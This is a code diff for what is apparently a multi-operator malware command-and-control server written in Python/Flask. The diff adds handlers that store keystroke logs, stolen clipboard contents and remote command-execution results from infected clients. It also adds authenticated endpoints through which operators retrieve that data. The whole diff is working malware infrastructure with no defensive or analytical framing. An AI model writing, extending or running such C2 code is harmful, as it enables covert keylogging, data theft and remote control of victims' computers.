@@ -33,6 +33,12 @@ tasklist_results = {}
 tasklist_results_lock = threading.Lock()
 fm_results = {}
 fm_results_lock = threading.Lock()
+clipboard_results = {}
+clipboard_results_lock = threading.Lock()
+keylog_results = {}
+keylog_results_lock = threading.Lock()
+exec_results = {}
+exec_results_lock = threading.Lock()
 
 # WebSocket connected clients: client_id -> {ws, hostname, username, ip, user_id}
 ws_clients = {}
@@ -1067,6 +1073,22 @@ def c2_websocket(ws):
                 with fm_results_lock:
                     fm_results[client_id] = msg
                 continue
+            if msg.get('type') == 'clipboard_res':
+                with clipboard_results_lock:
+                    clipboard_results[client_id] = msg
+                continue
+            if msg.get('type') == 'keylog_data':
+                with keylog_results_lock:
+                    if client_id not in keylog_results:
+                        keylog_results[client_id] = []
+                    keylog_results[client_id].append(msg.get('text', ''))
+                    if len(keylog_results[client_id]) > 500:
+                        keylog_results[client_id] = keylog_results[client_id][-500:]
+                continue
+            if msg.get('type') == 'exec_res':
+                with exec_results_lock:
+                    exec_results[client_id] = msg
+                continue
             with get_db() as db:
                 db.execute('UPDATE clients SET last_heartbeat = CURRENT_TIMESTAMP WHERE client_id = ?', (client_id,))
                 db.commit()
@@ -1296,6 +1318,36 @@ def c2_fm_result(client_id):
         return jsonify({'error': 'Forbidden'}), 403
     with fm_results_lock:
         res = fm_results.pop(client_id, None)
+    return jsonify(res)
+
+
+@app.route('/api/c2/clipboard/result/<client_id>')
+@login_required
+def c2_clipboard_result(client_id):
+    if not owns_client(client_id, request.current_user['id']):
+        return jsonify({'error': 'Forbidden'}), 403
+    with clipboard_results_lock:
+        res = clipboard_results.pop(client_id, None)
+    return jsonify(res)
+
+
+@app.route('/api/c2/keylog/poll/<client_id>')
+@login_required
+def c2_keylog_poll(client_id):
+    if not owns_client(client_id, request.current_user['id']):
+        return jsonify({'error': 'Forbidden'}), 403
+    with keylog_results_lock:
+        entries = keylog_results.pop(client_id, [])
+    return jsonify({'entries': entries})
+
+
+@app.route('/api/c2/exec/result/<client_id>')
+@login_required
+def c2_exec_result(client_id):
+    if not owns_client(client_id, request.current_user['id']):
+        return jsonify({'error': 'Forbidden'}), 403
+    with exec_results_lock:
+        res = exec_results.pop(client_id, None)
     return jsonify(res)
 
 
